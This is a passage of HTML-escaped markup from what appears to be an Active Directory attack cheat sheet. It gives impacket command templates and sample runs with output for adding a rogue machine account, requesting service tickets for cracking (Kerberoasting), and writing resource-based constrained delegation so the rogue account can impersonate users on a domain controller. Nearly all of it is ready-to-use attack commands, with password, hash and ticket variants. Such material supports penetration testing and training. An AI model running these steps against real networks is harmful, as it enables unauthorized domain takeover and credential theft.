sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -k -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -k -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-get-service-principle-name-spn-optional&#34;&gt;3. Get Service Principle Name (SPN) [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10 -request                                 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4-rbcd-attack-control-over-an-account-with-spn&#34;&gt;4. RBCD Attack [Control over an Account with SPN]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; 